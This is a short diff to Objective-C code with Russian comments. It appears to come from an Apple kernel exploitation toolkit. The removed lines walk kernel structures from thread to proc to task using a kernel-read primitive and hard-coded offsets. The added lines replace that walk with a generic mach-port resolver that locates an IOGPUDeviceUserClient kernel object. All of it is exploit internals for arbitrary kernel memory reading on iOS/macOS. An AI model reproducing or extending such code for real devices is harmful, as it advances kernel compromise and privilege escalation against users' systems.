@@ -5272,19 +5272,11 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     IOObjectRelease(svc);
     if (kr || !conn) { [r appendString:@"FAIL: ни один тип не открылся\n"]; return r; }
 
-    // 2. port → kobject (IOGPUDeviceUserClient)
-    // proc_self() через сокет возвращает 0 — идём по tro: thread→tro→proc→task
-    mach_port_t tp = mach_thread_self();
-    uint64_t tva = [self rcResolveThreadKVA:tp];
-    mach_port_deallocate(mach_task_self(), tp);
-    uint64_t tro = kp_untag_ptr(kp_rc_kread64(tva + 0x3E8));
-    uint64_t selfProc = kp_untag_ptr(kp_rc_kread64(tro + off_thread_ro_tro_proc));
-    uint64_t p_ro = kp_untag_ptr(kp_rc_kread64(selfProc + off_proc_p_proc_ro));
-    uint64_t selfTask = kp_untag_ptr(kp_rc_kread64(p_ro + off_proc_ro_pr_task));
-    kpNote(r, [NSString stringWithFormat:@"  hops: tva=%#llx tro=%#llx proc=%#llx p_ro=%#llx task=%#llx (tro_proc off=%#x)",
-               tva, tro, selfProc, p_ro, selfTask, off_thread_ro_tro_proc]);
-    uint64_t uc = kp_untag_ptr(task_get_ipc_port_kobject(selfTask, conn));
-    kpNote(r, [NSString stringWithFormat:@"  userclient @ %#llx (proc=%#llx task=%#llx)", uc, selfProc, selfTask]);
+    // 2. port → kobject (IOGPUDeviceUserClient): резолвер generic — для любого
+    // mach-порта (ie_object → ipc_port → ip_kobject). Сначала прогреваем таблицу.
+    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; return r; }
+    uint64_t uc = kp_untag_ptr([self rcResolveThreadKVA:conn]);
+    kpNote(r, [NSString stringWithFormat:@"  userclient @ %#llx", uc]);
     if (!kpLooksLikeKernelPointer(uc)) { [r appendString:@"FAIL: uc resolve\n"]; return r; }
 
     // 3. цепочка: UC+0x120 → IOGPUDevice, +0x88 → IOGPU
